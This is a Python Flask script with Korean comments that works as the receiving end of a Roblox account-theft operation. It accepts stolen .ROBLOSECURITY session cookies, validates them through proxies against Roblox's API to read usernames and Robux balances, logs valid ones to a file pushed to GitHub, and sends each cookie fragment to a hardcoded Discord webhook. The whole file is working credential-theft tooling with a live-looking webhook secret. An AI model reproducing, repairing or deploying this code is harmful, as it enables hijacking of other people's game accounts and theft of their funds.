import requests, json, os, subprocess, time, random
from datetime import datetime
from flask import Flask, request
from threading import Thread

# ===== 이거 하나만 진짜로 =====
WEBHOOK = "https://discord.com/api/webhooks/1519016223558340763/VGMWxHAntSmh5o18yRoziahcucUREBqfTEbX2IItByAjpPPAQeHTqtDyQnAzY8mmPX4w"

# 프록시가 없으면 일단 이거라도 (진짜 프록시로 교체 필요)
PROXIES = [
    "http://proxy1:port",
    "http://proxy2:port",
]

# GitHub 경로 - 없으면 자동 생성
REPO_PATH = os.path.expanduser("~/beaming-repo")
# ==============================

# --- 여기부터는 자동 ---
if not os.path.exists(REPO_PATH):
    os.makedirs(REPO_PATH)
    os.chdir(REPO_PATH)
    subprocess.run(["git", "init"], capture_output=True)
    subprocess.run(["git", "remote", "add", "origin", "https://github.com/yourname/yourrepo.git"], capture_output=True)
    with open("cookies.txt", "w") as f: f.write("")
    subprocess.run(["git", "add", "."], capture_output=True)
    subprocess.run(["git", "commit", "-m", "init"], capture_output=True)
    subprocess.run(["git", "branch", "-M", "main"], capture_output=True)

def send_discord(msg, color=0x00ff00):
    try:
        requests.post(WEBHOOK, json={"embeds": [{"description": msg, "color": color}]})
    except: pass

def check_cookie(cookie, proxy):
    try:
        r = requests.get("https://www.roblox.com/mobileapi/userinfo",
                         headers={"Cookie": f".ROBLOSECURITY={cookie}"},
                         proxies={"http": proxy, "https": proxy}, timeout=10)
        if r.status_code == 200:
            d = r.json()
            return d.get("UserID"), d.get("UserName"), d.get("RobuxBalance", 0)
    except: pass
    return None, None, None

def process_cookie(cookie):
    send_discord(f"🔄 쿠키 받음: {cookie[:30]}...", 0xffff00)
    for p in PROXIES:
        uid, name, robux = check_cookie(cookie, p)
        if uid:
            os.chdir(REPO_PATH)
            with open("cookies.txt", "a") as f:
                f.write(f"[{datetime.now()}] {name}({uid}) | {robux}R$\n")
            subprocess.run(["git", "add", "cookies.txt"], capture_output=True)
            subprocess.run(["git", "commit", "-m", f"{name}"], capture_output=True)
            subprocess.run(["git", "push"], capture_output=True)
            send_discord(f"✅ {name} | {robux}R$")
            return
        time.sleep(random.randint(1, 2))
    send_discord("❌ 모두 실패", 0xff0000)

app = Flask(__name__)
@app.route("/", methods=["POST"])
def webhook():
    data = request.get_json()
    if data and data.get("cookie"):
        Thread(target=process_cookie, args=(data["cookie"],)).start()
    return "ok"

if __name__ == "__main__":
    print("✅ 서버 실행 중 - http://0.0.0.0:5000")
    app.run(host="0.0.0.0", port=5000)
